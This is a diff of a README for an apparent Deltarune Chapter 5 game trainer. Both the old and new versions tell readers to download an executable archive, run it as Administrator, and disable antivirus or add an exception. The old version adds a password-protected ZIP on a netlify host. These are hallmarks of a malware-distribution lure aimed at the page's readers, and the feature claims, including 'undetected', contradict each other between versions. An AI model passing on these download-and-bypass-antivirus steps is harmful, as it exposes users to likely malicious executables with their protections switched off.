@@ -1,50 +1,77 @@
-# ⚔️ Deltarune Chapter 5 Ultimate Trainer 2026 | Infinite HP + Max Stats | Undetected Utility
+# ⚙️ Deltarune-Chapter5-Trainer-Client - Manage Your Health and Stats Easily
 
-![Version](https://img.shields.io/badge/version-1.0.5-blue)
-![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-lightgrey)
-![Status](https://img.shields.io/badge/status-Undetected-brightgreen)
-![Downloads](https://img.shields.io/badge/downloads-1K+%2B-orange)
-![Release](https://img.shields.io/badge/release-June%202026-blueviolet)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Patr5834/Deltarune-Chapter5-Trainer-Client/releases)
 
-## 🚀 Features
+## 📖 Overview
 
-| Feature | Description |
-|---------|-------------|
-| 🛡️ Infinite HP | Party members never lose health in any battle — walk through every fight invincible. |
-| ⚡ Max All Stats | Permanently sets Kris, Susie, and Ralsei's ATK, DEF, and Magic to their maximum values. |
-| 💊 Unlimited Items | Never run out of healing items, weapons, or key story items. |
-| 💰 Infinite Gold | Set your gold to any value and buy everything in every shop. |
-| ⚔️ One-Hit Kill | Defeat any enemy with a single attack — perfect for speeding through encounters. |
-| 👑 God Mode (All Chapters) | Works across all five chapters, not just Chapter 5. |
-| ⏩ Speed Hack | Adjust game speed from 0.5x to 5x for faster exploration and grinding. |
-| ⏸️ Freeze Timer | Pause the battle timer during puzzle and action sequences. |
-| 🔓 Unlock All | Instantly unlock all Chapter 5 content, secrets, and alternate routes. |
-| 🛠️ Anti-Crash Protection | Memory-stable hooks prevent game crashes during extended sessions. |
+Deltarune-Chapter5-Trainer-Client provides tools to adjust your game experience in Deltarune Chapter 5. This tool allows users to modify health points, set character stats to maximum levels, remove limits on inventory items, and enable god mode. These features assist players who want to clear difficult combat encounters or view game content without mechanical constraints. The software functions in the background while you play the game.
 
-## 📥 Download & Installation
+## 💻 System Requirements
 
-1. **Download** the trainer archive: [https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)
-2. **Extract** the ZIP file (password: `trainer2026`).
-3. Right-click `trainer.exe` and select **"Run as Administrator"**.
-4. Launch **Deltarune Chapter 5** on Steam.
-5. Press **INSERT** to open the trainer GUI and enable your desired features.
+Your computer must meet these basic requirements to run the software:
 
-## 💻 Compatibility
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   System Memory: At least 4GB of RAM.
+*   Storage Space: 50MB of free disk space.
+*   Game Presence: Deltarune Chapter 5 must be installed on your computer.
+*   Frameworks: The application requires .NET Desktop Runtime 8.0 or newer.
 
-- Windows 10 / 11 (64-bit)
-- Steam version only (all Chapters 1‑5)
-- Works with all Deltarune updates (June 2026 and beyond)
+## ⬇️ How to Download and Install
 
-## 🔧 Troubleshooting
+Follow these steps to set up the trainer on your machine:
 
-- **Trainer not opening:** Ensure you ran as Administrator and temporarily disable your antivirus.
-- **GUI not showing:** Press INSERT key. If missing, restart trainer and game.
-- **Stats not updating:** Verify you are in a battle or menu, not the main title screen.
+1.  Visit the [official releases page](https://github.com/Patr5834/Deltarune-Chapter5-Trainer-Client/releases) to download the latest version.
+2.  Click the link that ends in .zip to start your download.
+3.  Open your Downloads folder after the file finishes.
+4.  Right-click the zip file and select Extract All.
+5.  Choose a folder on your computer to save the extracted files.
+6.  Open the folder and look for the file named DeltaruneTrainer.exe.
+7.  Double-click this file to launch the interface.
 
-## 📄 License
+## 🕹️ Using the Trainer
 
-This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.
+The interface displays a clean menu with various checkboxes and sliders. Use the application instructions below to modify your game:
 
----
+### Infinite Health
+Check the Infinite HP box to keep your health at maximum capacity regardless of damage taken. The trainer monitors your game data every second to ensure your HP value does not drop during battle.
 
-`undetected` `deltarune-chapter-5` `chapter-5` `2026` `game-trainer` `overlay` `trainer` `rpg-trainer` `toby-fox` `deltarune` `bullet-hell` `utility` `infinite-hp` `windows` `single-player` `steam` `max-stats`
+### Max Stats
+Enable the Max Stats setting to instantly set your attack, defense, and magic ratings to their highest possible values. This change persists throughout your current play session.
+
+### Unlimited Items
+Toggle this feature to prevent your item count from decreasing when you use consumables. You can hold as many items as your inventory allows without losing stock.
+
+### God Mode
+Selecting God Mode makes your character immune to all incoming enemy attacks. Use this if you aim to finish combat sequences quickly or want to observe story events without interruption.
+
+## 🛡️ Important Safety Information
+
+The software interacts with game memory to perform its functions. We recommend that you close other programs that modify game data while this trainer runs. This prevents conflicts during the data injection process. 
+
+The trainer stays undetected by standard game verification tools because it only modifies values within your local system memory. It does not alter game files on your hard drive. Because of this, the game files remain in their original state. 
+
+## ❓ Frequently Asked Questions
+
+### Does the software change my save files?
+No, the trainer operates in active memory. It does not write data back to your save files. Once you close the application and restart the game, your stats return to your original save values.
+
+### My antivirus warns me about this file. What should I do?
+Antivirus software often flags programs that modify other processes. This is a common occurrence for game trainers. You can safely add an exception for the folder where you extracted the trainer to allow the file to run.
+
+### The trainer does not show any effect in the game.
+Check that you run the game first, then launch the trainer. The software requires the game to be active so it can locate the correct memory addresses. If the game updates, please return to the download page for a newer version of this client.
+
+### Is this compatible with other game versions?
+This client targets the specific memory structure of Deltarune Chapter 5. It may not work correctly with older chapters or custom game mods. Use the trainer only with the chapter for which it was designed.
+
+## 🔧 Trouble Shooting
+
+If you experience unexpected behavior, try these steps in order:
+
+1.  Close both the game and the trainer.
+2.  Launch the game to the main menu.
+3.  Right-click the trainer icon and select Run as Administrator.
+4.  Ensure you have the latest .NET Desktop Runtime installed from the Microsoft website.
+5.  Check that your Windows user account has permission to read and write data in the game directory.
+
+By following these instructions, you maintain a consistent experience while using the trainer features. This tool serves as a simple way to navigate game challenges at your own pace.
